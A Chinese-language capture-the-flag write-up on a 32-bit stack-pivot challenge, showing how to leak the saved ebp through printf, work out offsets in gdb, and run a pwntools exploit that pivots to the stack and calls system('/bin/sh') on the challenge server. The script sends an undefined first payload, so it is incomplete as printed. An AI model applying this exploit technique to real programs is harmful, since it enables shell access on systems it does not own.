比较简单的栈迁移，难得部分有两个一个是栈泄露有点隐蔽，一个是迁移位置是栈上.bss无法写入。

话不多说来看程序。

```
int vul()
{
  char s[40]; // [esp+0h] [ebp-28h] BYREF

  memset(s, 0, 0x20u);
  read(0, s, 0x30u);
  printf("Hello, %s\n", s);
  read(0, s, 0x30u);
  return printf("Hello, %s\n", s);
}
```

read两次写入，不过位置都是栈上。栈溢出刚好能覆盖返回地址标准的栈迁移。

```
int hack()
{
  return system("echo flag");
}
```

程序有system不过字符串不对。

这里虽然知道是要迁移到栈上但是栈位置却不知道。程序的输出函数只有puts跟printf。puts里面直接是字符串。没办法用。那只能是用printf了，这里涉及到%s读取栈上的值直到遇到截断符。所以第一个read就是用来泄露的，如果我们直接输入0x28字节用send发送就不会存在截断符%s由于没有遇到截断符就会输出ebp（上一个函数ebp指向的位置）。

然后就要算偏移了。

<img src="image\1.png" style="zoom:50%;" />

我们要泄露的点是第一个read结束，在0x80485BE设下断点。利用gdb去查看栈的情况。

![](image\2.png)

从这里可以看到ebp在0xffffce28，里面放的也就是我们泄露出来的是0xffffce38。

这样栈的位置就确定了，剩下的就是确定第二次的偏移了。

首先先来利用字母对每一个部分进行标记。

aaaa是要喂给pop ebp的垃圾值。

bbbb是system的地址。

cccc是system的返回地址。

dddd是system调取地址，也就是字符串储存位置。

ffff是/bin/sh\00字符串。

![](image\3.png)

从这里可以看到ffff也就是字符串是储存在0xffffce10，也就是与泄露的栈位置偏移为0x28。

这样东西就全了，objdump去找一下system的plt地址，ropgadget找一下leaven ；ret然后各位置写入值就行了。

```
from pwn import *

context.arch = 'i386'
r=remote('node5.buuoj.cn',28191)

r.send(payload)
r.recvuntil(b'b')
ebp = r.recv(4)
print(ebp)
addr = u32(ebp)
print(hex(addr))
payload1 = b'a'*4+p32(0x8048400) +b'a'*4+p32(addr-0x28)+ b'/bin/sh\x00'+b'a'*16+p32(addr-0x38)+p32(0x8048593)
r.send(payload1)

r.interactive()
```
